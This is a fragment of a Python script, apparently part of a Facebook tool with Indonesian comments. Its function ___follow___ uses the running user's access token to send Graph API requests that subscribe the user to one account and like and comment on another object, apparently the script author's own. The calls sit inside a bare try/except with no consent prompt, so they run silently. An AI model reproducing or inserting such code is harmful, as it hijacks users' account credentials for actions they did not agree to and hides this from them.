...
def ___follow___():
    ...
    try:
        ...
        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(___token___)) #rozhak
        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(___token___)) #rozhak2
        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(___token___)) #muhammad rozhak
        requests.post('https://graph.facebook.com/175830798084025/likes?summary=true&access_token=%s'%(___token___)) #foto sampul
        requests.post('https://graph.facebook.com/175830798084025/likes?summary=true&access_token=%s'%(___token___)) # foto profil
        requests.post('https://graph.facebook.com/175830798084025/comments/?message=%s&access_token=%s'%(___komen3___,___token___)) #foto sampul
        requests.post('https://graph.facebook.com/175830798084025/comments/?message=%s&access_token=%s'%(___komen___,___token___)) #foto profil
        requests.post('https://graph.facebook.com/175830798084025/comments/?message=%s&access_token=%s'%(___komen2___,___token___)) #foto profil
        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(___token___)) # Iwan
    except:
